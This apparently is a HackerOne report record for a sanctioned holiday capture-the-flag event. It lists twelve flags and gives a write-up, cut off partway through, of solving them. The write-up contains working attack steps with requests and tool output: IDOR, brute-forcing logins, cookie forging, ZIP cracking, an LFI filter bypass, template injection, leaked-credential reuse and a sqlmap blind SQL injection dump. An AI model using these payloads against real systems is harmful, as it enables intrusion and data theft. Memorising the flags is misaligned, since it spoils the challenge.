{"id":1065493,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY1NDkz","url":"https://hackerone.com/reports/1065493","title":"[CTF] I've DDoSed Grinch Network","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-12-23T21:27:45.204Z","submitted_at":"2020-12-23T21:27:45.270Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jeti","url":"/jeti","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-11T21:29:04.813Z","bug_reporter_agreed_on_going_public_at":"2021-01-11T10:51:11.944Z","team_member_agreed_on_going_public_at":"2021-01-11T21:29:04.710Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello!\n\nHere are all 12 flags for HackyHolidays CTF:\n1. flag{48104912-28b0-494a-9995-a203d1e261e7}\n2. flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\n3. flag{b705fb11-fb55-442f-847f-0931be82ed9a}\n4. flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\n5. flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n6. flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\n7. flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\n8. flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\n9. flag{6e8a2df4-5b14-400f-a85a-08a260b59135}\n10. flag{99309f0f-1752-44a5-af1e-a03e4150757d}\n11. flag{07a03135-9778-4dee-a83c-7ec330728e72}\n12. flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\n\n{F1127693}\n\n I will post full write-up shortly in the comment.\n\n## Impact\n\nGrinch Networks no longer exists!","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1127693,"file_name":"chrome_dsVkINTjep.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/r98ckbs8r0qmy9e917cnbchppwn5?response-content-disposition=attachment%3B%20filename%3D%22chrome_dsVkINTjep.png%22%3B%20filename%2A%3DUTF-8%27%27chrome_dsVkINTjep.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVIDF5ZMX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132103Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDQQQUuKj8T5pdoqR2Krp3zajoi1gg54vXvD2Ne1FwhmAIhAKKfb3UfAQbrUu4HHC%2B4UyMY7m5fBTHvtLlTV0hUevF7KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy%2F64SgTlh6KUEnD5Uq1wMsL4Z6ljP60c3R7lO1zjypi9biR2g5iQoP%2FT3s6lOKdbpGuE3RHjMeja9YKKN7goc11u6bYdonocyi6RU8RN2An2aRnhfVo3l%2FZlMwpffUbu5JHc7OKmtZqUXTysPRszIl1CCSQ50yZBwtNWg%2Fxavv6bNKeHjCjYNwQxGBqC%2ByBW24czUMzGzaD5uFMoYGAMoWIxFJ6iHFG8UfXfoB1shKsZ3jkdkCp2MI12RtkuUec%2F0QW%2BSUqdLWUg2p3%2B1H%2FJaoFmNN5Utibk4elkj5kRmoejx7EnpbtxcHN1J6Ccb1mMlapHFqvmkcjE8fLu3vLMoRZX0qMhHcbtwHM4mmdbMGDcLaK4ZzuGUfKK3tlGfzyb%2BJEOYnCFd1OBdp9DB9bhiSMWyc1JifbNweT%2F1X1i3QMSQ%2BviuXf%2Bxvep9dRJ8nErGx9JdRp3yS8jCqdzkSh9FhreaRloo4jHkFXz72rd1zbbphih0VnX1T1kREihWx9RKRGpfOf2ct6w59fDThEMiXM7%2B1ZWMP1qPO2XDz8hAqeQqURPDe5AmiGn%2FZKFThe%2F8xzj0%2B5M2W36t3rKudZmsfzk9t0V0gZgIgIqXzHYE871rDImxmRy6q2HeWGIt10F1JC%2Fc9vpEwvO6QiwY6pAFAIHM092pG3M%2B23%2BPi00SqMMlTN%2FebpZH7d1Rq7%2BpDNNT62MHysMiTIJwmN0mj3cgRIiDLQKqFPlp97hcSQcDzJF%2F5WJ%2FSpWbDFtqVjRTP9eZ3KoMBEOEbvq2IGUFF14lCJNIXEj03clafpnnHjjr5akYILvb51xnKlHai4iTUO00TgVrv5%2FXDjYcFV06nU8YCB3mUWnDHCpTI6c%2BltGO9Yt9pxQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=62b7906cbd92724ecf415abf8d263d12dd9d8dd3d0b73b49da7675e8d487f227","file_size":218597,"type":"image/png"}],"allow_singular_disclosure_at":"2021-02-10T10:51:11.983Z","allow_singular_disclosure_after":-21004191.626814224,"singular_disclosure_allowed":true,"vote_count":3,"voters":["hulkvision_","0nlymohammed","mahdoodbet"],"severity":{"rating":"critical","score":10.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"low"}},"structured_scope":{"databaseId":59882,"asset_type":"URL","asset_identifier":"hackyholidays.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10268953,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"#","automated_response":false,"created_at":"2021-01-04T22:31:52.844Z","updated_at":"2021-01-04T22:31:52.844Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10268998,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello!\n\nHappy new year and congratulations on being one of the first 10 hackers to solve the 12 Days of Hacky Holidays! If you'd like to receive a HackerOne care package, please email your full name, address, email address and phone number to █████████@hackerone.com \n\nThanks,\nBen","automated_response":false,"created_at":"2021-01-04T22:34:32.653Z","updated_at":"2021-01-11T21:25:12.211Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10299648,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-01-07T21:34:50.572Z","updated_at":"2021-01-07T21:34:50.572Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"jeti","url":"/jeti"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10326389,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-11T10:51:11.966Z","updated_at":"2021-01-11T10:51:11.966Z","first_to_agree":true,"actor":{"username":"jeti","cleared":false,"url":"/jeti","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/yx1viTW9oDGqB1gL1dz6GzEi/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10333560,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-11T21:29:04.737Z","updated_at":"2021-01-11T21:29:04.737Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10333562,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-11T21:29:04.863Z","updated_at":"2021-01-11T21:29:04.863Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":26030,"category":"researcher","content":"# Flag 1\n\nFirst flag was the most difficult one for me because I always forget checking `robots.txt` file :)\n\n```http\nGET /robots.txt HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n\n\nHTTP/1.1 200 OK\nUser-agent: *\nDisallow: /s3cr3t-ar3a\nFlag: flag{48104912-28b0-494a-9995-a203d1e261e7}\n```\n### Flag 1: flag{48104912-28b0-494a-9995-a203d1e261e7}\n\n# Flag 2\n\nWeb page https://hackyholidays.h1ctf.com/s3cr3t-ar3a was stating *'come back tomorrow'*. So on next day when we visit it we are greeted with following message:\n{F1127095}\n\nLet's check the source code. Nothing very exciting... Except this part:\n```html\n\u003cscript src=\"/assets/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\" integrity=\"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n```\nAll files (CSS, JS) are hosted from Content Delivery Network **except JQuery**. After checking the source code of locally hosted *jquery.min.js* we can find this added code:\n\n```javascript\n      , h1_0 = 'la'\n      , h1_1 = '}'\n      , h1_2 = ''\n      , h1_3 = 'f'\n      , h1_4 = 'g'\n      , h1_5 = '{b7ebcb75'\n      , h1_6 = '8454-'\n      , h1_7 = 'cfb9574459f7'\n      , h1_8 = '-9100-4f91-';\n    document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);\n    document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');\n```\nThat means this part of JS modifies DOM tree with `setAttribute()`.\nLet's fire up Dev Tools in Chrome to inspect DOM tree. We can immediately spot this part:\n```html\n\u003cdiv class=\"alert alert-danger text-center\" id=\"alertbox\" data-info=\"flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\" next-page=\"/apps\"\u003e\n                \u003cp\u003eI've moved this page to keep people out!\u003c/p\u003e\n                \u003cp\u003eIf you're allowed access you'll know where to look for the proper page!\u003c/p\u003e\n            \u003c/div\u003e\n```\n\n### Flag 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\n\nFrom now on all flags were new apps published under `/apps`directory.\n# Flag 3 - People Rater\n{F1127105}\nPeople Rater is an app that presents ratings assigned by Grinch to various people.\nWhen we examine the request made when specific person's rating should be presented on screen we observe this:\n```http\nGET /people-rater/entry?id=eyJpZCI6NH0= HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n\nHTTP/1.1 200 OK\n\n{\"id\":\"eyJpZCI6NH0=\",\"name\":\"Ruth Ward\",\"rating\":\"Disgusting\"}\n```\nString with `eyJ` prefix ? That almost always means Base64 encoded JSON!\n\n`base64decode('eyJpZCI6NH0=')` = `{\"id\":7}`\n\nWe can try exploiting classic IDOR and change `id` value and pass it to the application (after base64 encoding):\n`base64encode('{\"id\":0}')` = `eyJpZCI6MX0=`\n\n```html\nGET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n\nHTTP/1.1 200 OK\n\n{\"id\":\"eyJpZCI6MX0=\",\"name\":\"The Grinch\",\"rating\":\"Amazing in every possible way!\",\"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"}\n```\n### Flag 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a}\n\n# Flag 4\n{F1127124}\n\nSwag Shop app as the name suggests is a shopping application. It heavily rely on API available at https://hackyholidays.h1ctf.com/swag-shop/api.\nThere are couple of endpoints already visible in javascript:\n* /api/login\n* /api/stock\n* /api/purchase\n\nQuick fuzzing with `ffuf` reveals few more:\n```bash\nffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w ~/wordlists/Web-Content/common.txt -mc all -ac\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ\n________________________________________________\n\nsessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]\nstock                   [Status: 200, Size: 167, Words: 8, Lines: 1]\nuser                    [Status: 400, Size: 35, Words: 3, Lines: 1]\n```\n\nFirst endpoint `/sessions` reveal interesting session information:\n```json\n{\"sessions\":[\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]\",\n\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]\",\n\"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]\"\n]}\n```\nAll strings are base64 encoded and have similar structure after decoding:\n```json\n{\"user\":null,\"cookie\":\"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0Ym[...]\"}\n```\nOne of the strings is different and has non-null `user` field:\n```json\n{\"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMW[...]\"}\n```\n\nLet's check another API endpoint: `/api/user`. When accessed directly it throws an error that params are not defined:\n```http\nGET /swag-shop/api/user HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n\nHTTP/1.1 400 Bad Request\n\n{\"error\":\"Missing required fields\"}\n```\n\nFuzzing param names reveal required parameter:\n```bash\nffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=xxx -w ~/wordlists/Web-Content/burp-parameter-names.txt -mc all -ac\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=xxx\n________________________________________________\n\nuuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]\n```\n\nLet's use `user` value retrieved from `/api/sessions` as a value for `uuid` parameter:\n ```http\nGET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n\nHTTP/1.1 200 OK\n\n{\"uuid\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"username\":\"grinch\",\"address\":{\"line_1\":\"The Grinch\",\"line_2\":\"The Cave\",\"line_3\":\"Mount Crumpit\",\"line_4\":\"Whoville\"},\"flag\":\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"\n```\n\n### Flag 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\n\n#Flag 5\n{F1127212}\n\n## Enumerating username and password\nOn https://hackyholidays.h1ctf.com/secure-login we are greeted with login screen.\nFirst thing to check on any login screen is if there is a difference in error message when we provide valid username (Invalid username vs. invalid password).\nIf error message differs and there is no rate limiting on `login` endpoint we can enumerate valid usernames by checking for which users error message will change.\n\nIt seems that providing wrong username results in following error message:\n{F1127218}\n\nEnumerating usernames with filtering out responses with 'Invalid Username' string:\n```\nffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -d \"username=FUZZ\u0026password=1\" -w ~/tools/SecLists/Usernames/Names/names.txt -H \"Content-Type: application/x-www-form-urlencoded\" -mc all -fr \"Invalid Use\"\n________________________________________________\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: /home/jeti/tools/SecLists/Usernames/Names/names.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=FUZZ\u0026password=1\n________________________________________________\n\naccess                  [Status: 200, Size: 1724, Words: 464, Lines: 37]\n```\n\nEnumerating password:\n```\nffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -d \"username=access\u0026password=FUZZ\" -w ~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -H \"Content-Type: application/x-www-form-urlencoded\" -mc all -fr \"Invalid Pass\"\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: /home/jeti/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=access\u0026password=FUZZ\n :: Filter           : Regexp: Invalid Pass\n________________________________________________\n\ncomputer                [Status: 302, Size: 0, Words: 1, Lines: 1]\n```\n\nUsername: **access**\nPassword: **computer**\n\nAfter login we get following message:\n{F1127660}\n\n#Access to admin files\nWhen we log in following cookie is assigned:\n```\nsecurelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=\n```\nAgain we have base64 encoded string:\n```\n{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}\n```\nAfter changing parameter `admin` to *true* and re-encoding cookie again we get access to admin files:\n```http\nGET /secure-login HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\nCookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d\n\nHTTP/1.1 200 OK\n\n[...]\n\u003ctd\u003e\u003ca href=\"/my_secure_files_not_for_you.zip\"\u003emy_secure_files_not_for_you.zip\u003c/a\u003e\u003c/td\u003e\n```\n{F1127760}\n## Password protected ZIP\nDownloaded Zip file turned out to be password protected.\nLet's crack it with good old John the Ripper :)\n```shell\n$ zip2john my_secure_files_not_for_you.zip \u003e zip.hash\n$ john -w rockyou.txt zip.hash --format=pkzip\n\nmy_secure_files_not_for_you.zip:hahahaha\n```\nAfter unzipping the file we exctract the flag.txt:\n```\n$ unzip my_secure_files_not_for_you.zip\nArchive:  my_secure_files_not_for_you.zip\n[my_secure_files_not_for_you.zip] xxx.png password:\n  inflating: xxx.png\n extracting: flag.txt\n\n$cat flag.txt\nflag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n```\n\n### Flag5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n\n# Flag 6\n{F1127768}\nImmediately after visiting My diary app we see that there is a potential for Local File Inclusion (LFI) due to `template` parameter accepting local file name: https://hackyholidays.h1ctf.com/my-diary/?template=entries.html\n\nChanging `template` parameter to `index.php` reveals PHP source code of main page:\n```php\n\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\nOur goal here is to access source code of `secretadmin.php` page.\nUnfortunately there is a mechanism implemented that removes `admin.php` and `secretadmin.php` strings from template parameter.\n\nAs specific strings are REMOVED we can construct following string:\n* secresecretadmadmin.phpin.phptadmadmin.phpin.php \n* after removing of `admin.php` -\u003e `secresecretadmin.phptadmin.php`\n* after removing of secretadmin.php -\u003e  `secretadmin.php`\n\nAfter visiting URL https://hackyholidays.h1ctf.com/my-diary/?template=secresecretadmadmin.phpin.phptadmadmin.phpin.php\nwe get access to flag:\n{F1127769}\n\n### Flag 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\n\n#Flag 7\n{F1127770}\n## Templating system\nThis app uses some kind of templating system to generate hate mailing campaigns.\nFrom existing mailing campaign called `Guess What` we can get information how to include template from external file:\n{F1127785}\nSo it's possible to include external file with `{{template:external_filename}}` syntax.\n\nWhen we create new campaign and preview it's contents, following request is made:\n```http\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\npreview_markup=Hello {{name}} ....\u0026preview_data={\"name\":\"Alice\",\"email\":\"alice@test.com\"}\n\nHTTP/1.1 200 OK\n\nHello Alice....\n```\n\n## Template directory\nWhen we change `preview_markup` parameter and instruct the server to include non existing external template:\n```http\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n[...]\n\npreview_markup=Hello {{template:nonexistent}} ....\u0026preview_data={\"name\":\"Alice\",\"email\":\"alice@test.com\"} \n\nHTTP/1.1 200 OK\nCannot find template file /templates/nonexistent\n```\nWhich reveals that `/templates` directory exists. Let's check its contents (luckily directory listing is enabled):\n{F1127790}\n\nIt is not possible to access those files directly (403 Forbidden).\n## Template Injection\nAlso it is not possible to access file `38dhs_admins_only_header.html` via including it as a template:\n```http\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nConnection: close\n\npreview_markup=Hello {{template:38dhs_admins_only_header.html }} ....\u0026preview_data={\"name\":\"Alice\",\"email\":\"alice@test.com\"} \n```\nas we get following response:\n```http\nHTTP/1.1 200 OK\nConnection: close\nContent-Length: 64\n\nYou do not have access to the file 38dhs_admins_only_header.html\n```\n\nBut it seems that when we inject template command into `preview_data` parameter this command will be evaluated without restrictions:\n```http\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\n\npreview_markup=Hello {{name}} ....\u0026preview_data={\"name\":\"{{template:38dhs_admins_only_header.html}}\",\"email\":\"alice@test.com\"}\n```\nresponse:\n```html\nHello \u003chtml\u003e\n\u003cbody\u003e\n\u003ccenter\u003e\n    \u003ctable width=\"700\"\u003e\n        \u003ctr\u003e\n            \u003ctd height=\"80\" width=\"700\" style=\"background-color: #64d23b;color:#FFF\" align=\"center\"\u003eGrinch Network Admins Only\u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd style=\"padding:20px 10px 20px 10px\"\u003e\n                \u003ch4\u003eflag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\u003c/h4\u003e ....\n```\n### Flag 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\n\n# Flag 8\n\nGrinch started a forum. It seems that our goal here is to login as admin and read posts from admin only section.\n\n## GitHub repository\nIt turned out that this flag required some OSINT skills. When checking Adam Langley (CTF author) GitHub account\nhttps://github.com/adamtlangley we can spot that his last commit was done on `GrinchNetworks/forum` repository:\n{F1128318}\n\nThis repository contains whole source code of Grinch Forum app.\nNext thing is to analyze how application works and also to analyze commit history. Sometimes developers push sensitive data (credentials, API keys) with the code. \n\nAnd in fact  in one of the commits we can see that Adam removed database credentials:\n{F1128338}\n\n* DB User: forum\n* DB Password: 6HgeAZ0qC9T6CQIqJpD\n\n## Phpmyadmin\nQuick directory fuzzing reveals that there is `phpmyadmin` installed here: https://hackyholidays.h1ctf.com/forum/phpmyadmin. Lets try to login with leaked DB credentials.\n\nWe were able to login with those credentials and we have access to `forum` database and `user` table:\n{F1128359}\n\nWe can see that user `grinch` is an admin and we have access to hash of his password:\n**35D652126CA1706B59DB02C93E0C9FBF**\n\n## Password hash\nQuick check on https://crackstation.net/ reveals that this hash was already cracked:\n{F1128363}\nAnd `grinch` password is `BahHumbug`\n\n## Login as admin\nUsing above credentials we can log in as admin and reveal the flag:\n{F1128432}\n\n### Flag 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\n# Flag 9\n{F1129138}\nEvil Quiz is an application where user:\n1. Provides his name\n2. Answers some quiz questions.\n3. Gets his score.\n\nAgain, probably the goal here is to log in as admin.\nA careful eye can spot information about number of users having the same name as name provided by user in Step 1. This is probably put there intentionally as a feedback for some vulnerability. After some basic checks It turned out that this assumption was correct. Name parameter is vulnerable to SQL injection:\nTrue statement:\n{F1129639}\n\nFalse statement:\n{F1129639}\n\nSo this is second order blind boolean sql injection. I guess the intention of CTF autor was to prevent automatic tools like `sqlmap` to find this vulnerability and in fact those tools won't be able to find it.\n\nBut when we know how to trigger the vulnerability we can use the power of  `sqlmap` to ex-filtrate the database.\n`sqlmap` is able to check for second order SQL injections with use of `--second-url` and `--second-req` parameters.\n\nAlso we can specify that this is boolean injection type `--technique=B` and provide the response representing false condition with `--not-string`. To make it easy for `sqlmap` to locate specific parameters we will provide two HTTP requests (one for sending the payload (`-r`) and second for retrieving the response (`--second-req`):\n```shell\n$ sqlmap -r evil-quiz1.req --second-req=evil-quiz2.req --not-string=\"There is 0\" --technique=B -D quiz -T admin -C password --dump\n\n[22:18:59] [INFO] parsing HTTP request from 'evil-quiz1.req'\n[22:18:59] [INFO] parsing second-order HTTP request from 'evil-quiz2.req'\n[22:18:59] [INFO] resuming back-end DBMS 'mysql'\n[22:18:59] [INFO] testing connection to the target URL\n\nParameter: name (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: name=grinch' AND 9363=9363 AND 'mRVl'='mRVl\n---\n[22:19:34] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.18.0\nback-end DBMS: MySQL \u003e= 5.0.12\n[22:19:34] [INFO] fetching entries of column(s) '`password`' for table 'admin' in database 'quiz'\n[22:19:34] [INFO] fetching number of column(s) '`password`' entries for table 'admin' in database 'quiz'\n[22:19:34] [INFO] resumed: 1\n[22:19:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval\n[22:19:34] [INFO] retrieved:\n[22:19:38] [WARNING] reflective value(s) found and filtering out\nS3creT_p4ssw0rd-$\nDatabase: quiz\nTable: admin\n[1 entry]\n+-------------------+\n| password          |\n+-------------------+\n| S3creT_p4ssw0rd-$ |\n+-------------------+\n```\nWe found admin password. After login in we get the flag:\n{F1129717}\n\n### Flag 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}\n\n# Flag 10 - Signup Manager\nOn Signup Manager user name register his account and after approval he will become a member of Grinch Army.\n\n## Comment left by developer\nAfter checking page source code we can spot a comment left by developer:\n```html\n \u003c!-- See README.md for assistance --\u003e\n```\nContent of this *README.md*:\n\u003e **SignUp Manager**\n\u003e \n\u003e SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.\n\u003e \n\u003e **How to Install**\n\u003e 1) Create a directory that you wish SignUp Manager to be installed into\n\u003e 2) Move signupmanager.zip into the new directory and unzip it.\n\u003e 3) For security move users.txt into a directory that cannot be read from website visitors\n\u003e 4) Update index.php with the location of your users.txt file\n\u003e 5) Edit the user and admin php files to display your hidden content\n\u003e 6) You can make anyone an admin by changing the last character in the users.txt file to a Y\n\u003e 7) Default login is admin / password\n\n## Access to source code\n*README.md* file mentioned `signupmanager.zip` file. Let's download it:\n```bash\nwget https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip\nunzip signupmanager.zip\n  inflating: README.md\n  inflating: admin.php\n  inflating: index.php\n  inflating: signup.php\n  inflating: user.php\n```\n\n## Source code review\n\nAfter reviewing source code we see that usernames are stored in `users.txt` where each user 